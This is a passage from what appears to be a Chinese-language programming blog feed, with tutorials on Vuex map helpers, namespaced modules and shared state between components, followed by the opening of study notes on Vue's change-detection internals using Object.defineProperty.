class="hljs-name">h3</span>&gt;</span>当前求和放大是10倍为：</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">$store.getters.bigSum</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br></code></pre></td></tr></table></figure><h2 id="6-map"><a href="#6-map" class="headerlink" title="6.map"></a>6.map</h2><p>map是vuex对应数据 一种映射，也许听起来十分难懂，我们就来实际操作一下</p><p>根据vue中模板语法要尽量简单的原则，我们的<code>$store.state.sum</code>便显得十分的不简洁，于是我们想到了用计算属性，这样插值语法中就只用写一个</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">sum()&#123;<br>return <span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.sum<br>&#125;<br></code></pre></td></tr></table></figure><p>但是这样，一旦state中的数据变多，也会很难看</p><h3 id="1-mapState"><a href="#1-mapState" class="headerlink" title="1.mapState"></a>1.mapState</h3><p>所以我们拥有了mapState</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pf">computed: &#123;<br>  // ...mapState(&#123; he: <span class="hljs-string">&quot;sum&quot;</span> &#125;),//计算属性通过&#x27;sum&#x27;在<span class="hljs-keyword">state</span>中去查找，得到<span class="hljs-keyword">state</span>中的sum，然后计算为he--对象形式<br>  ...mapState([<span class="hljs-string">&quot;sum&quot;</span>,<span class="hljs-string">&quot;school&quot;</span>,<span class="hljs-string">&quot;subject&quot;</span>]), //或者写成数组形式，得到的计算属性名也是sum<br>  &#125;<br></code></pre></td></tr></table></figure><p>mapState实际上返回的是一个对象</p><p><img src="https://s2.loli.net/2022/05/16/XPvsYQVpk6zSj14.png" alt="mapstate返回.png"></p><p>这样的对象放入computed中便可以得到我们想要的效果，而<code>...</code>做到的是将mapstate中的对象挨个取出，放入computed中（es6语法）</p><h3 id="2-mapGetters"><a href="#2-mapGetters" class="headerlink" title="2.mapGetters"></a>2.mapGetters</h3><p>和mapState类似我们加入mapGetters</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">..<span class="hljs-selector-class">.mapGetters</span>(<span class="hljs-selector-attr">[<span class="hljs-string">&quot;bigSum&quot;</span>]</span>),<br></code></pre></td></tr></table></figure><h3 id="3-mapMutations"><a href="#3-mapMutations" class="headerlink" title="3.mapMutations"></a>3.mapMutations</h3><p>我们的<code>this.$store.commit(&quot;ADD&quot;, this.n);</code>对应的函数，也可以通过map生成</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>通过map生成和mutations沟通的dispatch--(对象形式)<br>...mapMutations(&#123;<span class="hljs-string">&#x27;increment&#x27;</span>:<span class="hljs-string">&#x27;ADD&#x27;</span>,<span class="hljs-string">&#x27;decrement&#x27;</span>:<span class="hljs-string">&#x27;SUB&#x27;</span>&#125;),<br><span class="hljs-regexp">//m</span>apMutations数组形式<br><span class="hljs-regexp">//</span> ...mapMutations([<span class="hljs-string">&#x27;increment&#x27;</span>,<span class="hljs-string">&#x27;decrement&#x27;</span>]),<br></code></pre></td></tr></table></figure><p>但是需要注意这里没有参数了，所以我们需要在click处绑定参数n</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;increment(n)&quot;</span>&gt;</span>+<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;decrement(n)&quot;</span>&gt;</span>-<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;incrementOdd(n)&quot;</span>&gt;</span>当前求和奇数再加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;incrementWait(n)&quot;</span>&gt;</span>等一等再加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="4-mapActions"><a href="#4-mapActions" class="headerlink" title="4.mapActions"></a>4.mapActions</h3><p>与mapMutations类似，<code>this.$store.dispatch(&quot;addOdd&quot;, this.n);</code>对应的函数也可以通过map生成</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>以上可以写成mapActions<br>...mapActions(&#123;<span class="hljs-string">&#x27;incrementOdd&#x27;</span>:<span class="hljs-string">&#x27;addOdd&#x27;</span>,<span class="hljs-string">&#x27;incrementWait&#x27;</span>:<span class="hljs-string">&#x27;addWait&#x27;</span>&#125;)<br></code></pre></td></tr></table></figure><p>同样有数组形式，这里就不再赘述</p><h2 id="7-组件间共享数据"><a href="#7-组件间共享数据" class="headerlink" title="7.组件间共享数据"></a>7.组件间共享数据</h2><p>我们既然已经拥有了vuex，那么如何做到组件间数据共享呢？</p><p>我们再添加一个person组件，得到的是一个学生姓名列表，而且可以添加学生。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>人员列表<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color : red&quot;</span>&gt;</span>Count组件的和为</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">sum</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;请输入学生名&quot;</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">&quot;name&quot;</span> /&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addPerson&quot;</span>&gt;</span>添加<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span></span><br><span class="xml">    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">v-for</span>=<span class="hljs-string">&quot;p in personList&quot;</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">&quot;p.id&quot;</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">p.name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span><br><span class="xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span></span><br><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>按照上面的操作，我们把personList这个学生列表放入vuex</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">addPerson() &#123;<br>  <span class="hljs-keyword">const</span> personObj = &#123; id: nanoid(), name: <span class="hljs-keyword">this</span>.name &#125;;<span class="hljs-comment">//包装成一个对象</span><br>  <span class="hljs-keyword">this</span>.$store.commit(<span class="hljs-string">&#x27;add_Person&#x27;</span>, personObj); <span class="hljs-comment">//因为不用逻辑判断所以直接放入mutations中</span><br>  <span class="hljs-keyword">this</span>.name = <span class="hljs-string">&#x27;&#x27;</span><br>&#125;,<br></code></pre></td></tr></table></figure><p>如何在mutations中：</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pf">mutations: &#123;<br>        add_Person(<span class="hljs-keyword">state</span>, personObj) &#123;//接收传入的personObj<br>            <span class="hljs-keyword">state</span>.personList.unshift(personObj)//传入数组<br>        &#125;<br>    &#125;,<br></code></pre></td></tr></table></figure><p>现在我们需要交互数据：在Count组件中加入读取personList长度的代码</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h3</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;color: red&quot;</span>&gt;</span>Person组件的人数为</span><span class="hljs-template-variable">&#123;&#123; <span class="hljs-name">personList.length</span> &#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>既然要用这个代码，我们就需要先读取：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>computed中<br>...mapState([<span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;school&quot;</span>, <span class="hljs-string">&quot;subject&quot;</span>, <span class="hljs-string">&quot;personList&quot;</span>]), <span class="hljs-regexp">//</span>或者写成数组形式，得到的计算属性名也是sum<br></code></pre></td></tr></table></figure><p>这样就实现了组件间数据的交互</p><h2 id="8-vuex-模块化编程"><a href="#8-vuex-模块化编程" class="headerlink" title="8. vuex 模块化编程"></a>8. vuex 模块化编程</h2><p>在我们用上面方法写vuex的时候容易造成数据和操作的冗杂</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pf"> <span class="hljs-keyword">const</span> actions = &#123;<br>    add(context, value) &#123;//context为上下文，类似于一个minstore<br>        context.commit(&#x27;ADD&#x27;, value)<br>    &#125;,<br>    sub(context, value) &#123;<br>        context.commit(&#x27;SUB&#x27;, value)<br>    &#125;,<br>&#125;,<br><span class="hljs-keyword">const</span> mutations = &#123;<br>    ADD(<span class="hljs-keyword">state</span>, value) &#123;<br>        <span class="hljs-keyword">state</span>.sum += value<br>    &#125;,<br>    SUB(<span class="hljs-keyword">state</span>, value) &#123;<br>        <span class="hljs-keyword">state</span>.sum -= value<br>    &#125;,<br>&#125;<br></code></pre></td></tr></table></figure><p>如果有许多来自不同组件的操作那么我们的action将会非常难看</p><p>所以！！！我们拥有了vuex的模块化编程——将属于不同组件的actions，mutations，state按照组件分类</p><p>注意需要添加namespaced，和modules</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs pf">//对数据和操作进行分类<br>//组件Count<br><span class="hljs-keyword">const</span> countOption = &#123;<br>    namespaced: true,//需要添加namespaced分配空间<br>    actions: &#123;<br>        add(context, value) &#123;//context为上下文，类似于一个minstore<br>            context.commit(&#x27;ADD&#x27;, value)<br>        &#125;,<br>        sub(context, value) &#123;<br>            context.commit(&#x27;SUB&#x27;, value)<br>        &#125;,<br>        addOdd(context, value) &#123;<br>            if (context.<span class="hljs-keyword">state</span>.sum % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;//sum在context中的<span class="hljs-keyword">state</span>中<br>                context.commit(&#x27;ADD&#x27;, value)<br>            &#125;<br>        &#125;,<br>        addWait(context, value) &#123;<br>            <span class="hljs-built_in">set</span>Timeout(() =&gt; &#123;<br>                context.commit(&#x27;ADD&#x27;, value)<br>            &#125;, <span class="hljs-number">500</span>);<br>        &#125;,<br>    &#125;,<br>    mutations: &#123;<br>        ADD(<span class="hljs-keyword">state</span>, value) &#123;<br>            <span class="hljs-keyword">state</span>.sum += value<br>        &#125;,<br>        SUB(<span class="hljs-keyword">state</span>, value) &#123;<br>            <span class="hljs-keyword">state</span>.sum -= value<br>        &#125;,<br>    &#125;,<br>    <span class="hljs-keyword">state</span>: &#123;<br>        sum: <span class="hljs-number">0</span>,<br>        school: &#x27;swpu&#x27;,<br>        subject: &#x27;vue&#x27;,<br>    &#125;,<br>    getters: &#123;<br>        bigSum(<span class="hljs-keyword">state</span>) &#123;<br>            return <span class="hljs-keyword">state</span>.sum * <span class="hljs-number">10</span><br>        &#125;<br>    &#125;,<br>&#125;<br><br>//组件Person<br><span class="hljs-keyword">const</span> personOption = &#123;<br>    namespaced: true,<br>    actions: &#123;&#125;,<br>    mutations: &#123;<br>        add_Person(<span class="hljs-keyword">state</span>, personObj) &#123;//接收传入的personObj<br>            <span class="hljs-keyword">state</span>.personList.unshift(personObj)//传入数组<br>        &#125;<br>    &#125;,<br>    <span class="hljs-keyword">state</span>: &#123;<br>        personList: [&#123; id: <span class="hljs-number">1</span>, name: &#x27;张三&#x27; &#125;]<br>    &#125;,<br>&#125;<br><br>//暴露的时候封装成modules<br>export <span class="hljs-keyword">default</span> new Vuex.Store(&#123;<br>    modules:&#123;<br>    countOption:countOption,<br>    personOption//简写形式<br>    &#125;<br>&#125;)<br><br></code></pre></td></tr></table></figure><h3 id="map简写的引入"><a href="#map简写的引入" class="headerlink" title="map简写的引入"></a>map简写的引入</h3><p>我们在组件中引入时：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">..<span class="hljs-selector-class">.mapState</span>(<span class="hljs-string">&quot;countOption&quot;</span>, <span class="hljs-selector-attr">[<span class="hljs-string">&quot;sum&quot;</span>, <span class="hljs-string">&quot;school&quot;</span>, <span class="hljs-string">&quot;subject&quot;</span>]</span>), <span class="hljs-comment">//或者写成数组形式，得到的计算属性名也是sum</span><br>..<span class="hljs-selector-class">.mapState</span>(<span class="hljs-string">&quot;personOption&quot;</span>, <span class="hljs-selector-attr">[<span class="hljs-string">&quot;personList&quot;</span>]</span>), <span class="hljs-comment">//两个modules需要单独配置state</span><br></code></pre></td></tr></table></figure><p>需要先申明所属模块</p><h3 id="常规写法"><a href="#常规写法" class="headerlink" title="常规写法"></a>常规写法</h3><p>但是如果我们的dispatch和commit等不是用map自动生成的呢？</p><p>首先我们看看state中怎么写：<img src="https://s2.loli.net/2022/05/16/lftJyVRzI3dULuq.png" alt="模块化后的state.png"></p><p>模块化后，我们得到的state被分开成了两个部分，而每个部分下分别存了对应的内容</p><p>所以我们的state代码：在state后添加对应的模块名字</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pf">personList() &#123;//读取personList<br>  return this.<span class="hljs-variable">$store</span>.<span class="hljs-keyword">state</span>.personOption.personList;<br>&#125;,<br></code></pre></td></tr></table></figure><p>commit代码：需要在personOption后面加/</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.$store.commit( <span class="hljs-string">&#x27;personOption/add_Person&#x27;</span>, personObj ); <br></code></pre></td></tr></table></figure><p>dispatch代码：与commit类似</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.$store.dispatch( <span class="hljs-string">&#x27;personOption/addNameWang&#x27;</span>, personObj ); <br></code></pre></td></tr></table></figure><p>getter代码：<img src="https://s2.loli.net/2022/05/16/shi2VtdBlUYAxqa.png" alt="模块化后getter.png"></p><p>可以看到getter模块化后每个属性也变成了和commit类似的/类型</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">firstPerson</span><span class="hljs-params">()</span></span>&#123;<br>    return this.<span class="hljs-variable">$store</span><span class="hljs-selector-class">.getters</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;personOption/firstPerson&#x27;</span>]</span><span class="hljs-comment">//因为.和/不能共存，所以改成数组的形式</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们的四个属性的常规写法也讲完了</p><h3 id="分类成文件"><a href="#分类成文件" class="headerlink" title="分类成文件"></a>分类成文件</h3><p>但是当我们的组件比较多的时候，我们这样子写也会显得冗杂，那么我们就在store文件夹下新建文件，分别叫Count.js Person.js 代表我们的两个组件，把他们两个暴露出来，再在index中引入就好了。</p><p>例如Count：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>    <span class="hljs-attr">namespaced</span>: <span class="hljs-literal">true</span>,<br>    <span class="hljs-attr">actions</span>: &#123;<br>        <span class="hljs-function"><span class="hljs-title">add</span>(<span class="hljs-params">context, value</span>)</span> &#123;<span class="hljs-comment">//context为上下文，类似于一个minstore</span><br>            context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>        &#125;,<br>        <span class="hljs-function"><span class="hljs-title">sub</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>            context.commit(<span class="hljs-string">&#x27;SUB&#x27;</span>, value)<br>        &#125;,<br>        <span class="hljs-function"><span class="hljs-title">addOdd</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>            <span class="hljs-keyword">if</span> (context.state.sum % <span class="hljs-number">2</span> == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//sum在context中的state中</span><br>                context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;<br>        &#125;,<br>        <span class="hljs-function"><span class="hljs-title">addWait</span>(<span class="hljs-params">context, value</span>)</span> &#123;<br>            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>                context.commit(<span class="hljs-string">&#x27;ADD&#x27;</span>, value)<br>            &#125;, <span class="hljs-number">500</span>);<br>        &#125;,<br>    &#125;,<br>    ...<br></code></pre></td></tr></table></figure><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-comment">//引入模块Count和Person</span><br><span class="hljs-keyword">import</span> countOption <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./Count&quot;</span>;<br><span class="hljs-keyword">import</span> personOption <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;./Person&quot;</span>;<br></code></pre></td></tr></table></figure><p>这样子我们的代码就变得更加简洁了</p><h3 id="发送请求方式写actions"><a href="#发送请求方式写actions" class="headerlink" title="发送请求方式写actions"></a>发送请求方式写actions</h3><p>但是有些情况下我们是通过axios发送请求获取数据再提交commit的</p><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">//给服务器发请求<br>addPersonServer(context) &#123;<br>    <span class="hljs-attribute">axios.get(&#x27;https</span>://api<span class="hljs-variable">.uixsj</span><span class="hljs-variable">.cn</span>/hitokoto/get?type=social&#x27;)<span class="hljs-variable">.then</span>(<br>        response =&gt; &#123;<br>            context<span class="hljs-variable">.commit</span>(&#x27;add_Person&#x27;, &#123; id: nanoid(), name: response<span class="hljs-variable">.data</span> &#125;)<br>        &#125;,<br>        error =&gt; &#123; <br>            alert(error<span class="hljs-variable">.message</span>);<br>        &#125;<br>    )<br>&#125;<br></code></pre></td></tr></table></figure><p>我们在收到正确的回调之后再发送commit</p><p>注意我们这里不需要Person组件中传递参数，所以只能写成常规形式:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">addPersonServer()&#123;<span class="hljs-regexp">//</span>不能用mapActions,因为mapActions中必须传参&#123;<span class="hljs-string">&#x27;addPersonServer&#x27;</span>:xxx&#125;<br>    this.<span class="hljs-variable">$store</span>.dispatch(<span class="hljs-string">&#x27;personOption/addPersonServer&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们就得到了一个与后端交互的vuex</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入浅出Vue.js 学习心得</title>
    <link href="/2022/05/12/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAVue.js%E3%80%8B%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/"/>
    <url>/2022/05/12/%E3%80%8A%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAVue.js%E3%80%8B%E5%AD%A6%E4%B9%A0%E5%BF%83%E5%BE%97/</url>
    
    <content type="html"><![CDATA[<h1 id="《深入浅出Vue-js》学习心得"><a href="#《深入浅出Vue-js》学习心得" class="headerlink" title="《深入浅出Vue.js》学习心得"></a>《深入浅出Vue.js》学习心得</h1><p>简介：CSDN和知乎上搜索学习资料的时候被推荐的这本书，里面主要是关于Vue源码的介绍，很细，富有引导性的一步一步解释Vue的源码和特殊之处。</p><h2 id="Chapter-1–变化侦测"><a href="#Chapter-1–变化侦测" class="headerlink" title="Chapter 1–变化侦测"></a>Chapter 1–变化侦测</h2><p>首先我们说说变化侦测是什么，简单来说变化侦测就是确定我们的应用发生了什么变化，而Vue的变化侦测的粒度属于中粒度-组件层面大小。变化侦测到之后我们进行虚拟DOM的比对，来重新渲染页面等等。</p><p>其实这个部分是分为了两节讲解的，分别是object和array，变化侦测在这两个对象上有所不同</p><h3 id="1-object变化侦测"><a href="#1-object变化侦测" class="headerlink" title="1. object变化侦测"></a>1. object变化侦测</h3><p>js所提供的object变化侦测的方法有两种，一种是<code>Object.defineProperty</code>，一种是ES6提供的<code>proxy</code>。而我们的Vue所使用的的便是<code>Object.defineProperty</code>。如果我们是Vue的开发者，我们现在就需要对这个函数进行加工封装，从而实现我们需要的响应式。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">function defineReactive (<span class="hljs-keyword">data</span>, key, <span class="hljs-keyword">val</span>) &#123;<span class="hljs-comment">//封装函数</span><br>    Object.defineProperty(<span class="hljs-keyword">data</span>, key, &#123;<span class="hljs-comment">//配置defineProperty</span><br>        enumerable: <span class="hljs-literal">true</span>,<span class="hljs-comment">//自带配置，是否能通过for遍历循环</span><br>        configurable: <span class="hljs-literal">true</span>,<span class="hljs-comment">//自带配置，是否可以更改属性</span><br>        <span class="hljs-keyword">get</span>: function () &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">val</span><br>        &#125;,<br>        <span class="hljs-keyword">set</span>: function (newVal) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-keyword">val</span> === newVal)&#123;<br>                <span class="hljs-keyword">return</span><br>            &#125;<br>            <span class="hljs-keyword">val</span> = newVal<br>        &#125;<br>    &#125;)<br>&#125;<br></code></pre></td></tr></table></figure><p>注意这里的set函数，首先判断了新值和旧值是否一样，不一样的情况下才进行重新赋值操作。</p><h4 id="收集依赖"><a href="#收集依赖" class="headerlink" title="收集依赖"></a>收集依赖</h4><p>现在我们要做的是添砖加瓦，第一件事情是 收集依赖 ，我们在get中收集依赖，在set中触发依赖。</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span></span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">name</span>&#125;&#125;</span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="xml">...</span><br><span class="xml"></span><br><span class="xml">data:&#123;</span><br><span class="xml">name:&#x27;&#x27;</span><br><span class="xml">&#125;</span><br></code></pre></td></tr></table></figure><p>比如这样的代码，程序中可能有很多地方使用到了name，<strong>收集依赖便是确定那些地方用法到了name</strong>。如果name改变我们需要通知所有用到name的地方name发生了改变，<strong>触发依赖便是将值的改变进行通知</strong></p><p>我们使用一个dep数组进行收集</p><p>我们需要在get中增加收集=&gt;<code>dep.push(window.target)</code>这里的<code>window.target</code>便是触发get的对象，也就是使用到name的地方</p><p>然后在set中触发收集到的依赖=&gt;使用一个遍历将dep中的value全部变化为newValue，这样我们便完成了触发依赖</p><p>我们还应该将我们的dep写成一个类，解耦而且可以更好的帮我们管理依赖。</p><h4 id="Watcher"><a href="#Watcher" class="headerlink" title="Watcher"></a>Watcher</h4><p>现在为了加快我们依赖触发的效率和通用性，我们将所有收集到的<code>window.target</code>转化成一个Watcher类，当我们需要通知变化的时候就可以给Watcher发送消息。Watcher就类似于一个中介。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Watch</span> </span>&#123;<br>    <span class="hljs-keyword">constructor</span> (expOrFn, cb) &#123;<br>        <span class="hljs-comment">// 执行 this.getter() 就可以拿到 data.a.b.c</span><br>        <span class="hljs-keyword">this</span>.getter = parsePath(expOrFn)<span class="hljs-comment">//触发getter读取数据，将this加入dep</span><br>        <span class="hljs-keyword">this</span>.cb = cb<br>        <span 